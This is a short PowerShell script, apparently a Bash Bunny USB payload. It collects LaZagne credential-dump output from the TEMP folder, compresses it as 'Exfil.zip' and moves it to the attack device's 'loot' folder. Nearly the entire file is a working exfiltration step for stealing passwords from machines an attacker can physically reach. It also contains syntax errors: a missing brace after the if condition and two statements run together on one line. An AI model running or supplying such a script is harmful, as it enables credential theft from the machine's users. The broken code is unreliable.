$temp = $env:TEMP
$archiveFolder = Join-Path $temp "ExfilPreCompress"
New-Item -ItemType Directory -Path $archiveFolder -Force | Out-Null
$files = @(
	Join-Path $temp "LaZagne.txt" #Add the rest of the files to this list to be added to archive and compressed
	)
$files | Move-Item -Destination $archiveFolder
$zipPath = Join-Path $temp "Exfil.zip"
Compress-Archive -Path $archiveFolder -DestinationPath $zipPath -Force
Remove-Item $archiveFolder -Recurse -Force
Write-Output "Exfil Data Compressed to $zipPath now moving to bash bunny drive"
$usbDrive = Get-WmiObject Win32_LogicalDisk | Where-Object {
	$_.DriveType -eq 2 -and (Test-Path "$($_.DeviceID)\loot")
} |
Select-Object -ExpandProperty DeviceID -First 1

if(-not $usbDrive)
	Write-Output "ERROR: Bash Bunny loot drive not found"
	exit
}

Write-Output "Bash Bunny detected on drive $usbDrive"

$loot = Join-Path $usbDrive "loot\Exfil"
New-Item -ItemType Directory -Force -Path $loot | Out-Null Write-Output "Loot Folder: $loot"

Move-Item -Path $zipPath -Destination $loot

Write-Output "zip folder now resides at $zipPath"
